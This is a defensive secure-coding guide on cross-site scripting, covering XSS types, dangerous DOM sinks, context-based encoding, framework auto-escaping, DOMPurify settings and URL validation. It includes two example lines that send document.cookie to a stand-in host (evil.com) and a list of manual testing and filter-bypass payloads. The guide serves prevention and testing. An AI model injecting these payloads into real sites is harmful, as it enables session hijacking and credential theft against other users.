# XSS (Cross-Site Scripting) — Deep Module

## Threat Description

XSS allows attackers to inject malicious scripts into web pages viewed by other users. The script executes in the victim's browser with full access to the page's DOM, cookies, and session.

**Impact**: Session hijacking, credential theft, defacement, malware distribution, keylogging, phishing.

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

---

## XSS Types

### Stored XSS (Persistent)

```
Attack: Malicious script is saved in the database and served to all users who view the content.

Common locations:
- User profiles (bio, name, avatar URL)
- Comments, posts, messages
- Forum posts, reviews
- Product descriptions (if user-editable)
- File names (uploaded files)
- Support tickets
- Notification content

Example attack:
User saves comment: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
Every user viewing the comment executes the script.

Prevention:
1. Sanitize on input (strip dangerous tags)
2. Encode on output (HTML-encode when rendering)
3. Use Content Security Policy (CSP)
4. HttpOnly cookies (prevent cookie theft via XSS)
```

### Reflected XSS (Non-Persistent)

```
Attack: Malicious script is embedded in a URL/request and reflected back in the response.

Common locations:
- Search results ("You searched for: <script>...")
- Error messages ("Invalid parameter: <script>...")
- URL parameters reflected in page
- Redirect URLs
- 404 pages showing the requested URL

Example attack:
URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Prevention:
1. Encode all reflected parameters in output
2. Validate and sanitize URL parameters
3. Use CSP
4. Use X-XSS-Protection: 0 (disable broken browser filter, use CSP instead)
```

### DOM-Based XSS

```
Attack: Malicious script manipulates the DOM directly via client-side JavaScript without server involvement.

Vulnerable sinks (dangerous DOM operations):
- element.innerHTML = userInput
- element.outerHTML = userInput
- document.write(userInput)
- document.writeln(userInput)
- eval(userInput)
- setTimeout(userInput, ...)    // string form
- setInterval(userInput, ...)   // string form
- new Function(userInput)
- element.setAttribute('onclick', userInput)
- element.style.cssText = userInput
- location = userInput
- location.href = userInput
- location.assign(userInput)
- location.replace(userInput)
- window.open(userInput)
- document.cookie = userInput

Dangerous sources (user-controlled data):
- location.hash
- location.search
- location.href
- document.referrer
- document.cookie
- window.name
- postMessage data
- Web Storage (localStorage, sessionStorage)
- IndexedDB data

Safe alternatives:
- element.textContent = userInput        // safe: no HTML parsing
- element.setAttribute('data-x', value)  // safe for data attributes
- DOMPurify.sanitize(userInput)          // sanitized HTML
- encodeURIComponent(userInput)          // for URLs
```

---

## Prevention Checklist

### Output Encoding (Primary Defense)

```
RULE: Encode output based on the context where data appears.

Context         | Encoding Method              | Example
HTML Body       | HTML entity encode           | &lt;script&gt; → displayed as text
HTML Attribute  | Attribute encode + quote     | <div title="&quot;value&quot;">
JavaScript      | JS encode / JSON.stringify   | var x = "user\x3Cscript\x3E"
URL Parameter   | URL encode                   | encodeURIComponent(value)
CSS Value       | CSS encode or whitelist       | Only allow known-safe values

Libraries:
- Node.js: he, DOMPurify (server), sanitize-html
- Python: markupsafe.escape(), bleach
- Java: OWASP Java Encoder
- C#: System.Web.HttpUtility.HtmlEncode(), AntiXSS
- PHP: htmlspecialchars(value, ENT_QUOTES, 'UTF-8')
- Go: html/template (auto-escapes)
```

### Framework Auto-Escaping

```
Most modern frameworks auto-escape by default. VERIFY this is active:

React:      JSX auto-escapes by default
            DANGER: dangerouslySetInnerHTML bypasses it → sanitize with DOMPurify first
            DANGER: href={userInput} with javascript: protocol → validate URL

Vue:        {{ }} auto-escapes by default
            DANGER: v-html bypasses it → sanitize with DOMPurify first
            DANGER: :href="userInput" with javascript: protocol → validate URL

Angular:    {{ }} auto-escapes by default
            DANGER: [innerHTML]="userInput" → sanitized by Angular, but review
            DANGER: bypassSecurityTrustHtml() → NEVER use with user input

Svelte:     {expression} auto-escapes by default
            DANGER: {@html userInput} bypasses it → sanitize first

Server-side templates:
- Jinja2:   {{ }} auto-escapes (ensure autoescape=True)
            DANGER: {{ value|safe }} bypasses it
- EJS:      <%= %> auto-escapes, <%- %> does NOT
- Handlebars: {{ }} auto-escapes, {{{ }}} does NOT
- Pug:      = auto-escapes, != does NOT
- Blade:    {{ }} auto-escapes, {!! !!} does NOT
- Razor:    @ auto-escapes, @Html.Raw() does NOT
- Thymeleaf: th:text auto-escapes, th:utext does NOT
```

### HTML Sanitization (When Rich Content Needed)

```
IF the application MUST accept HTML from users (rich text editors, markdown):

RULE: Use a whitelist-based sanitizer. NEVER use blacklist.

DOMPurify (browser + Node.js):
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
                 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre', 'img'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_TAGS: [],
  ADD_ATTR: [],
  FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'style']
});

Additional sanitization rules:
- Strip javascript: protocol from href and src
- Strip data: protocol from src (or whitelist specific data: URIs)
- Strip vbscript: protocol
- Validate URLs in href/src (https:// only)
- Remove all event handler attributes (on*)
- Remove all style attributes (or sanitize CSS separately)
- Limit nesting depth
- Limit total HTML size

RULE: Sanitize on render, not just on save.
      (Database may have been populated before sanitizer was added)
```

### URL Validation

```
RULE: Validate URLs before rendering in href, src, or redirect.

Dangerous URL protocols:
- javascript:alert(1)
- data:text/html,<script>alert(1)</script>
- vbscript:MsgBox("XSS")
- blob:https://... (if user-controlled)

Safe validation:
function isValidUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

For redirects, also validate domain against whitelist.
```

### Markdown XSS

```
IF rendering user-provided Markdown:

Markdown can contain raw HTML → XSS vector.

Safe rendering:
1. Use a markdown parser that strips HTML (marked with sanitize option)
2. Or parse markdown → HTML, then sanitize HTML with DOMPurify
3. Or use a markdown parser that outputs AST → render from AST (safest)

Dangerous markdown features:
- Raw HTML blocks: <script>alert(1)</script>
- Link URLs: [click](javascript:alert(1))
- Image URLs: ![img](javascript:alert(1))
- Image onerror: ![img](x" onerror="alert(1))
- HTML entities in markdown

Libraries with safe defaults:
- marked (with DOMPurify post-processing)
- markdown-it (with html: false option)
- remark + rehype-sanitize
- Python-Markdown (with bleach post-processing)
- Commonmark (does not allow raw HTML by default)
```

---

## Testing for XSS

### Manual Testing Payloads

```
Basic:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
javascript:alert('XSS')

Attribute context:
" onfocus=alert('XSS') autofocus="
' onfocus=alert('XSS') autofocus='
" onmouseover=alert('XSS') "

Event handlers:
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

URL context:
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
java%0ascript:alert('XSS')

Filter bypass:
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert`XSS`>
<svg/onload=alert('XSS')>
```

### Automated Tools

```
- Burp Suite (scanner)
- OWASP ZAP (scanner)
- XSS Hunter (payload + callback)
- DOMPurify tests (verify sanitization)
- Browser DevTools (check for unsafe DOM operations)
- ESLint security plugins (detect dangerous patterns)
  - eslint-plugin-security
  - eslint-plugin-no-unsanitized
```

---

## References

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP DOM-Based XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- DOMPurify: https://github.com/cure53/DOMPurify
